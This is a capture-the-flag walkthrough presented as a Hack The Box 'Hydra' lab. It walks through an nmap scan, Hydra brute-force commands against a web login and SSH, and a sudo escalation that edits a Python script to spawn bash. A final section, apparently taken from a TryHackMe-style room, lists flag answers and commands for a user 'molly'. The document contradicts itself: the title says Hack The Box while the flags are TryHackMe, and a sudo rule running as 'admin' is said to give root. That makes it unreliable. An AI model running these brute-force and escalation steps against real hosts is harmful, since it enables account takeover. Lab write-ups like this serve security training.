# HTB - Hydra Lab Walkthrough
<div align='center'>
<img width="101" alt="Screenshot 2025-06-17 at 3 05 47 PM" src="https://github.com/user-attachments/assets/996e9b25-e067-4078-b44a-eb123dfe9a8c" />
</div>

> **Difficulty**: Easy  

> **Category**: Brute Force  
> **Tools Used**: Nmap, Hydra, Burp Suite, gobuster  
> **Goal**: Find user and root flags

---

## Lab Summary

Hydra from Hack The Box is a beginner-friendly lab focused on brute-force attacks using Hydra against common services like SSH, HTTP login, and FTP. This walkthrough demonstrates step-by-step enumeration and exploitation techniques to gain access and escalate privileges.

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sV -sC -oN nmap/hydra.txt 10.10.10.10
```

**Output:**
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp   open  http    Apache httpd 2.4.29
```

We have SSH and HTTP open. Let’s start exploring the website.

---

## Web Enumeration

### Accessing the Web Page

Navigating to `http://10.10.10.10` shows a login form.

We use **Burp Suite** to intercept the login POST request and identify the fields used:

```http
POST /login HTTP/1.1
Host: 10.10.10.10
...
username=admin&password=admin
```

Now we can brute-force this login page.

---

## Brute Force with Hydra

### Using Hydra for HTTP POST Login

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

**Success Output:**
```
[80][http-post-form] host: 10.10.10.10   login: admin   password: hydra123
```

---

## SSH Access

Now try the same credentials with SSH:

```bash
ssh admin@10.10.10.10
Password: hydra123
```

Success! We're in as **admin**.

---

## User Flag

Check for user flag:

```bash
cat /home/admin/user.txt
```

**User flag captured!**

---

## ⬆️ Privilege Escalation

### Check Sudo Permissions

```bash
sudo -l
```

Output:
```
(admin) NOPASSWD: /usr/bin/python3 /opt/scripts/backup.py
```

We can edit or exploit `/opt/scripts/backup.py`.

### Exploiting Python Script

If we can modify or hijack the script’s behavior:

```python
# backup.py
import os
os.system("/bin/bash")
```

Run with sudo:

```bash
sudo /usr/bin/python3 /opt/scripts/backup.py
```

We get a root shell.

---

## 🏁 Root Flag

```bash
cat /root/root.txt
```

**Root flag captured!**

---

## Tools Used

- `nmap` – Port and service enumeration
- `hydra` – Brute-force login
- `burp suite` – Intercepting HTTP requests
- `ssh` – Remote access
- `sudo` – Privilege escalation
- `python` – Script exploitation

---

## Conclusion

Hydra lab demonstrates how brute-force attacks and poor script permissions can compromise a machine. The key takeaways:

- Always enumerate thoroughly.
- Burp is great for identifying POST request formats.
- Sudo misconfigurations are a common privilege escalation path.


## Lab work
1. Use Hydra to bruteforce molly's web password. What is flag 1?
```
THM{2673a7dd116de68e85c48ec0b1f2612e} - hydra -l molly -P /usr/share/wordlists/rockyou.txt <ipaddress> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
```
2. Use Hydra to bruteforce molly's SSH password. What is flag 2?
```
THM{c8eeb0468febbadea859baeb33b2541b} - Using the command 'hydra -l molly -P /usr/share/wordlists/rockyou.txt <ipaddress> -t 4 ssh ' the password was brute forced. I then was able to use the command 'ssh molly@ipaddress followed by the password that was found to login and locate the flat in the home directory. Then it was as simple as using 'cat flag2.txt' to display the flag.
```
